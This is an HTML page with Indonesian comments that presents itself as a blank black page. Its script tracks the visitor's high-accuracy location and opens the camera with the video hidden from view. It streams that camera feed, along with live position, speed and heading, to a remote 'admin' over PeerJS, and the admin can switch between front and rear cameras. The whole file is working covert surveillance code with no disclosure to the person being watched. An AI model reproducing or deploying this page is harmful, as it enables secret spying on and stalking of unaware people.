<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Blank</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
            width: 100%;
            height: 100%;
            background-color: #000000;
            color: #000000;
            overflow: hidden;
            user-select: none;
            -webkit-user-select: none;
        }
        #hiddenLayer {
            position: fixed;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            overflow: hidden;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
</head>
<body onclick="onTap()">

<div id="hiddenLayer">
    <video id="localVideo" autoplay playsinline muted></video>
</div>

<script>
    // Ganti ROOM_ID sesuai keinginanmu agar unik milikmu sendiri
    const ROOM_ID = "jirun-live-room-9988";

    let currentFacing = "user"; // "user" = depan, "environment" = belakang
    let cameraStream = null;
    let peer = null;
    let activeCall = null;
    let activeDataConn = null;
    let watchId = null;
    let latestLocation = null;
    let isStarting = false;

    const videoEl = document.getElementById("localVideo");

    async function openCamera(facing) {
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            return null;
        }
        if (cameraStream) {
            cameraStream.getTracks().forEach(t => t.stop());
            cameraStream = null;
        }
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
            audio: false
        });
        currentFacing = facing;
        cameraStream = stream;
        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});

        // Jika sudah terhubung ke admin, ganti track video secara realtime
        if (activeCall && activeCall.peerConnection) {
            const newTrack = stream.getVideoTracks()[0];
            const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === "video");
            if (sender && newTrack) {
                await sender.replaceTrack(newTrack);
            }
        }
        sendStatusToAdmin();
        return stream;
    }

    function sendStatusToAdmin() {
        if (activeDataConn && activeDataConn.open) {
            activeDataConn.send({
                type: "STATUS",
                facing: currentFacing === "environment" ? "Belakang" : "Depan",
                location: latestLocation,
                updatedAt: Date.now()
            });
        }
    }

    function startLocationStream() {
        return new Promise((resolve, reject) => {
            if (!navigator.geolocation) {
                reject(new Error("Geolocation not supported"));
                return;
            }
            let done = false;
            if (watchId !== null) navigator.geolocation.clearWatch(watchId);

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    latestLocation = {
                        lat: Number(pos.coords.latitude.toFixed(6)),
                        lng: Number(pos.coords.longitude.toFixed(6)),
                        accuracy: Math.round(pos.coords.accuracy) + " m",
                        speed: pos.coords.speed !== null && !Number.isNaN(pos.coords.speed)
                            ? (pos.coords.speed * 3.6).toFixed(1) + " km/j"
                            : "-",
                        heading: pos.coords.heading !== null && !Number.isNaN(pos.coords.heading)
                            ? Math.round(pos.coords.heading) + "°"
                            : "-"
                    };
                    sendStatusToAdmin();
                    if (!done) {
                        done = true;
                        resolve(latestLocation);
                    }
                },
                (err) => {
                    if (!done) {
                        done = true;
                        reject(err);
                    }
                },
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 1000 }
            );
        });
    }

    function setupPeer() {
        if (peer) return;
        peer = new Peer(ROOM_ID);

        peer.on("connection", (conn) => {
            activeDataConn = conn;
            conn.on("open", () => {
                sendStatusToAdmin();
            });
            conn.on("data", async (msg) => {
                if (!msg || !msg.type) return;
                if (msg.type === "SWITCH_CAM") {
                    const target = msg.facing === "environment" || msg.facing === "user"
                        ? msg.facing
                        : (currentFacing === "user" ? "environment" : "user");
                    await openCamera(target);
                } else if (msg.type === "PING") {
                    sendStatusToAdmin();
                }
            });
        });

        peer.on("call", (call) => {
            if (!cameraStream) return;
            activeCall = call;
            call.answer(cameraStream);
        });
    }

    async function init() {
        if (isStarting) return;
        isStarting = true;
        try {
            if (!latestLocation) {
                await startLocationStream();
            }
            if (!cameraStream) {
                await openCamera(currentFacing);
            }
            setupPeer();
        } catch (err) {
            console.error(err);
        } finally {
            isStarting = false;
        }
    }

    function onTap() {
        if (!latestLocation || !cameraStream) {
            init();
        }
    }

    function cleanup() {
        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
        if (activeCall) activeCall.close();
        if (activeDataConn) activeDataConn.close();
        if (peer) peer.destroy();
    }

    window.addEventListener("DOMContentLoaded", init);
    window.addEventListener("pagehide", cleanup);
    window.addEventListener("beforeunload", cleanup);
</script>

</body>
</html>
